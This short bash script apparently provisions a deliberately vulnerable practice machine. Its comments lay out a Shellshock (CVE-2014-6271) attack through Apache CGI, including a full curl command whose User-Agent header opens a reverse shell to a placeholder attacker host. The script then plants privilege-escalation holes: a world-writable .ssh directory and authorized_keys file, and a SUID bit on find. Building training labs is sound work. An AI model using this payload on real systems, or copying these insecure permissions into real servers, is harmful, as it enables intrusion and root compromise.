#!/bin/bash
# CVE-2014-6271: Bash Shellshock via Apache CGI
# Foothold: RCE as www-data via User-Agent/Cookie HTTP header
# Exploit: curl -H "User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/ATTACKER/PORT 0>&1" http://TARGET/cgi-bin/victim.cgi
# Privesc: www-data -> ckplayer (writable .ssh), ckplayer -> root (find SUID)

# www-data can write to ckplayer's .ssh dir (misconfigured authorized_keys)
mkdir -p /home/ckplayer/.ssh
chmod 777 /home/ckplayer/.ssh
touch /home/ckplayer/.ssh/authorized_keys
chmod 666 /home/ckplayer/.ssh/authorized_keys
chown -R ckplayer:ckplayer /home/ckplayer/.ssh

# SUID find for ckplayer -> root
chmod u+s /usr/bin/find

# Ensure CGI is enabled in apache config
mkdir -p /var/run/apache2 /var/lock/apache2
